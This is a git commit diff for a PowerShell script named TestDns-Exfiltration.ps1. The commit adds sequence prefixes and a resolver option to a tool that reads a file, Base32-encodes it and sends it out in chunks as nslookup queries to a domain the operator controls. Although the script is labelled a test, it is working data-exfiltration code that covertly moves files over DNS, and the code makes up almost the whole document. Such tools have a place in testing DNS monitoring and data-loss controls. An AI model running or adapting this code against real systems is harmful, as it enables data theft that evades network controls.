28d02e2bb8f426882da921f8e0c339f203d71146
Felipe Gaspar <25889166+fgsec@users.noreply.github.com>
2020-09-03 17:18:24 -0300

    Update TestDns-Exfiltration.ps1
    Added prefix to requests, this way it can easily be reassembled.

--- TestDns-Exfiltration.ps1
+++ TestDns-Exfiltration.ps1
@@ -1,10 +1,8 @@
 function TestDns-Exfiltration {
-    param([string] $filePath, [string] $domain)
+    param([string] $filePath, [string] $domain, [string] $dns = "8.8.8.8")
     write-host "DNS File Exfiltration Test - @fgsec" -ForegroundColor "yellow"
-
     $block_size = 50
     if(Test-Path($filePath)) {
-        
         [byte[]] $bytes = [IO.File]::ReadAllBytes($filePath)
         $byteArrayAsBinaryString = -join $bytes.ForEach{[Convert]::ToString($_, 2).PadLeft(8, '0')}
         $Base32string = [regex]::Replace($byteArrayAsBinaryString, '.{5}', { param($Match) 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'[[Convert]::ToInt32($Match.Value, 2)] }) 
@@ -14,14 +12,15 @@ function TestDns-Exfiltration {
         read-host "Press enter to start"
         $key_start = 0
         $key_end = $block_size
+        $p = 0
         while($key_end -le ($Base32string.length)) {
             $payload = ($Base32string[$key_start..$key_end]) -join ""
-            $url =  "$payload.$domain"
+            $url =  "$p-$payload.$domain"
             write-host "[!] Request to: $url" -ForegroundColor gray
-            nslookup -type=TXT $url
-            nslookup $url
+            nslookup -type=TXT $url $dns
             $key_start = $key_end+1
             $key_end = $key_end + $block_size
+            $p++
         }
     } else {
         write-host "File not found!" -ForegroundColor red
@@ -29,4 +28,4 @@ function TestDns-Exfiltration {
    write-host "[#] Done" -ForegroundColor green
 }
 
-TestDns-Exfiltration "C:\users\public\testfile.docx" "yourdomain.com"
+TestDns-Exfiltration "C:\users\public\testfile.docx" "yourdomain"
